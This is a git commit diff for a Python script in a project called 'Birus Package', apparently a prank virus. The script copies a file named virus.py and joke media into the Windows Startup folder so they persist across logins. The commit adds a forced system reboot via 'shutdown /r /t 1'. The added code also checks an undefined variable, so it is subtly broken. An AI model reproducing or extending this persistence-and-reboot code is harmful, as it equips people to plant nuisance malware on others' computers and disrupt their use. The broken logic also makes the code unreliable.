78300706b007259e01483cd7a31255cd143e1fe2
Atlasbrine <68679350+Atlasbrine@users.noreply.github.com>
2020-08-21 17:01:45 +0600

    Now , it will shut down after copying framework1.py and other files :)

--- Birus Package/app.py
+++ Birus Package/app.py
@@ -3,8 +3,9 @@ import shutil
 thicc = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus.py')
 thicc3 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','henrystickmin.gif')
 thicc4 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','chungus.mp4')
-thicc5 = os.path.join(r'C:\Users',os.getlogin(),'AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup','virus3.py')
 shutil.copy('Framework1.py',thicc)
 shutil.copy('chungus.mp4',thicc4)
 shutil.copy('henrystickmin.gif',thicc3)
-shutil.copy('Framework 3.py',thicc5)
+shutdown =int (0) 
+if restart == 0: 
+    os.system("shutdown /r /t 1")
